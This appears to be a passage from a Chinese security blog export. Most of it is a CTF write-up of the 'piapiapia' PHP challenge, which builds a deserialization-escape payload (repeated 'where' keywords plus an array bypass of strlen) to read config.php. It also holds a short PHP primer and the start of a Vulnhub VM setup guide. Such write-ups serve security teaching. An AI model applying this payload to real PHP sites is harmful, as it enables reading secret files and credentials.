class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">UPDATE</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 6.index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Login</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">LOGIN</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<p>通过代码审计发现可能存在着以下三个漏洞：</p>
<ul>
<li>SQL注入</li>
<li>反序列化</li>
<li>文件上传</li>
</ul>
<p>我们输入得内容都会被过滤：</p>
<ul>
<li><code>'</code>和<code>\\\\</code>都会被替换成<code>_</code>;</li>
<li>select, update, delete, where 都会被替换成 hacker</li>
</ul>
<p>以login功能为例，如果想要SQL注入，我们需要：</p>
<ul>
<li>知道username是否存在</li>
<li>将查询得结果中的密码和我们输入的密码md5后进行强类型比较；</li>
</ul>
<p>这显然是不太可能绕过的，因此想一下文件上传。我们上传的任何文件都会被<code>move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));</code>，从而得不到php后缀的文件，因此文件上传也不可能。</p>
<p>那最后就剩下反序列了。通过对源码的分析，得到如下过程(从后往前)：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. config.php中有$flag；</span><br><span class="line">   </span><br><span class="line">2. profile.php中的$profile = unserialize($profile);，并且$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));将profile类对象中的photo的值读取出来</span><br><span class="line">   </span><br><span class="line">3. profile.php中的$profile=$user-&gt;show_profile($username);得到的$profile</span><br><span class="line">   </span><br><span class="line">4. update.php中的$user-&gt;update_profile($username, serialize($profile));传入$profile的值</span><br></pre></td></tr></table></figure></p>
<p>从前往后理一下思路：首先，我们通过更新简介传入4个属性，<code>phone, email, nickname, photo</code>；然后这四个属性经过序列化，再<strong>过滤</strong>最后得到$profile；然后又被profile.php调用，反序列化并将其中photo属性的值（应是文件名）读取base64编码后返回到页面。</p>
<h1 id="前置知识">2 前置知识</h1>
<h2 id="属性中含有数组该如何反序列化">2.1
属性中含有数组该如何反序列化</h2>
<p>编写如下测试代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">Array</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> Test2;</span><br><span class="line">print_r(serialize(<span class="variable">$test1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">print_r(serialize(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;&#125;  </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此，如果需要在序列化中提交数组，需要注意这一点，不仅需要闭合双引号，还要把<code>&#123;&#125;</code>也给闭合了。</p>
<h2 id="数组绕过一些函数">2.2 数组绕过一些函数</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="number">2</span>. sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="number">3</span>. ereg(pattern,<span class="keyword">Array</span>()) =<span class="literal">null</span></span><br><span class="line"><span class="number">4</span>. preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line"><span class="number">5</span>. strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) =<span class="literal">null</span></span><br><span class="line"><span class="number">6</span>. strpos(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line"><span class="number">7</span>. strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>以及 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="literal">null</span> &gt; <span class="number">10</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> &lt; <span class="number">10</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> == <span class="number">0</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> === <span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure></p>
<p>因此可以把null当作0，但是为bool型，所以强类型比较结果为false</p>
<h2 id="反序列化溢出">2.3 反序列化溢出</h2>
<p>可以查看<a
href="https://hdfzzf.icu/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/">反序列化知识点</a></p>
<h2 id="序列化后的属性顺序">2.4 序列化后的属性顺序</h2>
<p>编写代码测试： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果将属性颠倒一下，其余不变 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>得到的结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>结论</strong>：从以上实验可以看出，编写类的时候属性的先后顺序就是序列化后字符串中属性的先后顺序。</p>
<h1 id="解题">3 解题</h1>
<p>我们的目的就是将photo的值改为<code>config.php</code>，但是photo的内容会经过md5加密，因此不能直接利用，这时候就要利用photo一个面的属性，即nickname。（这里并没有给出profile类的属性的顺序，那就认为源码中赋值的顺序就是类中属性的顺序，如果不是再尝试嘛，这不是重点）</p>
<p>假设序列化后的字符串如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;&#125; </span><br></pre></td></tr></table></figure></p>
<p>如果我们在nickname里面塞下我们想要的photo的值<code>";s:5:"photo";s:10:"config.php";&#125;</code>，即：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">37</span>:<span class="string">&quot;m1ku&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125; </span></span><br></pre></td></tr></table></figure></p>
<p>虽然确实塞进去了，但是因为此时nickname的值的长度也在变化（变成了37），所以塞入的这些内容还是属于nickname。因此，需要想办法让其逃逸出来，根据以往类似题目的经验，<strong>如果序列化后的字符串经过过滤函数，把某些关键词替换成长度不一样的词，则会出现反序列化溢出漏洞</strong>。而本题确实存在过滤函数，那就是class.php中mysql类中的filter方法。</p>
<p>该方法过滤的情况在<a href="#1%20题目信息">1
题目信息</a>中说明过了，这里不再说明。由于我们传入的nickname不能有特殊的符号，所以我们采取第二种。注意到<code>where</code>替换成<code>hacker</code>时，字符串长度变了！因此，利用点就是这个。每有一个where，字符串就能逃逸出一个，我们需要注入的是<code>";s:5:"photo";s:10:"config.php";&#125;</code>长度为33，因此需要33个where。payload如下：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nickname</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>编写代码测试一下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;12345678910&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;m1ku@m1ku.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="variable">$pafter</span> = preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$p</span>);</span><br><span class="line">print_r(<span class="variable">$pafter</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">替换前：</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">198</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">替换后：</span></span><br><span class="line"><span class="string">O:7:&quot;</span>profile<span class="string">&quot;:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678910</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:13:&quot;</span>m1ku@m1ku.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">整理一下：</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;</span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">198</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125; <span class="comment">// 到这里正好，下一行内容被丢弃</span></span><br><span class="line"><span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125;      </span></span><br></pre></td></tr></table></figure></p>
<p>payload构造好了，接下来看一下有没有限制条件。发现除了过滤函数，还剩下一个，那就是<code>strlen($_POST['nickname']) &gt; 10</code>得为false，按照我们那么长的payload，这里肯定为true，这时候就利用<a
href="#2%202%20数组绕过一些函数">2 2
数组绕过一些函数</a>，传入<code>nickname[]</code>就能够为false，从而绕过。</p>
<p>而<a href="#2%201%20属性中含有数组该如何反序列化">2 1
属性中含有数组该如何反序列化</a>里面也说明了，如果类属性中有数组，需要闭合<code>&#123;&#125;</code>，因此最终需要注入的应该是：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; </span><br></pre></td></tr></table></figure></p>
<p>（注意}的位置，别搞错了）此时长度为34，因此，需要34个where，所以最终的payload如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname[]:</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来随便注册一个账号，然后登录，再profile.php页面输入信息(此时nickname先随便输)，然后抓包，修改其中nickname的值和名字：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171816.png" /></p>
<p>此时虽然有提示，但是已经上传成功了。然后回到profile.php页面，查看源码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171916.png" /></p>
<p>base64解码即可：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171951.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>源码审计</tag>
        <tag>反序列化溢出</tag>
        <tag>属性值为数组的序列化</tag>
        <tag>数组绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>1. PHP概述</title>
    <url>/2022/11/17/1.%20PHP%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="php-文件">1. PHP 文件</h1>
<ul>
<li>PHP 文件能够包含文本、html、css 以及 PHP 代码；</li>
<li>PHP 代码能够在服务器上运行，结果以纯 html 返回浏览器；</li>
<li>后缀是 <code>.php</code></li>
</ul>
<h1 id="php-作用">2. PHP 作用</h1>
<ol type="1">
<li>生成动态页面内容；</li>
<li>创建、打开、读取、写入、删除以及关闭服务器上的文件；</li>
<li>接受表单数据；</li>
<li>发送并取回 cookie；</li>
<li>添加、删除、修改数据库中的数据；</li>
<li>限制用户访问网站中的某些页面；</li>
<li>对数据进行加密；</li>
<li>输出图像、PDF 文件、甚至是 FLASH 影片；</li>
<li>输出任何文本，比如 XHTML 和 XML；</li>
</ol>
<h1 id="php-基本工作原理">3. PHP 基本工作原理</h1>
<ol type="1">
<li><p><strong>PHP 代码是在服务器端执行</strong>，返回纯 HTML 代码；</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115154451.png" /></p></li>
<li><p>可以只有 PHP 代码；</p></li>
<li><p>可以包含 HTML、CSS、JavaScript 代码；</p></li>
<li><p>可以写在 html 文件中的任何位置；</p></li>
<li><p>如果文档中有 php 代码，保存时扩展名必须以 <code>.php</code>
结尾；</p></li>
<li><p>必须保存在服务器上才可以运行；</p></li>
</ol>
<h1 id="php-标记">4. PHP 标记</h1>
<ol type="1">
<li>标准格式：<code>&lt;?php 内容 ?&gt;</code>，<code>&lt;?php</code>
是开始标记，<code>?&gt;</code> 是结束标记（建议）；</li>
<li>短格式：<code>&lt;? 内容 ?&gt;</code>，<code>&lt;?</code>
是开始标记，<code>?&gt;</code> 是结束标记（不建议）；</li>
<li>PHP 与 HTML 代码混合时，PHP 的开始与结束标记必须写，如果是纯 PHP
代码，可以不写结束标记；</li>
<li>用 PHP 标记包装的代码，在客户端不会被执行；</li>
</ol>
<h1 id="php-注释">5. PHP 注释</h1>
<ol type="1">
<li>单行注释：<code>// 注释内容</code></li>
<li>单行注释：<code># 注释内容</code></li>
<li>多行注释：<code>/* 注释内容 */</code></li>
</ol>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>1. Vulnhub Socialnetwork writeup</title>
    <url>/2022/03/27/1.%20Vulnhub%20Socialnetwork%20writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。将内网渗透过程中的主要知识点都涉及了，质量非常高。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</p>
<p>难度：Medium</p>
<p>虚拟机软件：Virtual Box</p>
<h1 id="虚拟机配置">虚拟机配置</h1>
<h2 id="virtual-box-下载安装">Virtual Box 下载、安装</h2>
<p>首先，去virtual box <a
href="https://www.virtualbox.org/wiki/Downloads">官网</a>下载，要下载两个东西：
1. 安装包 2. 扩展包</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143744.png" /></p>
<p>记住，安装包和扩展包的版本得一致，否则扩展包无法安装。</p>
<p>下载完毕之后，先安装Virtual Box，安装完毕之后选择
<code>管理-&gt;全局设定-&gt;扩展</code>
然后选择刚刚下载好的扩展包即可。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143913.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143956.png" /></p>
<h2 id="网络配置">网络配置</h2>
<ol type="1">
<li>打开主机的 <code>网络适配器选项</code>
找到主机连接网络的网卡，然后共享到
<code>VirtualBox Host-Only Ethernet Adapter</code>。</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144304.png" /></p>
<p>设置共享的时候会跳出一个对话框，里面有IP地址，要记住它。</p>
<ol start="2" type="1">
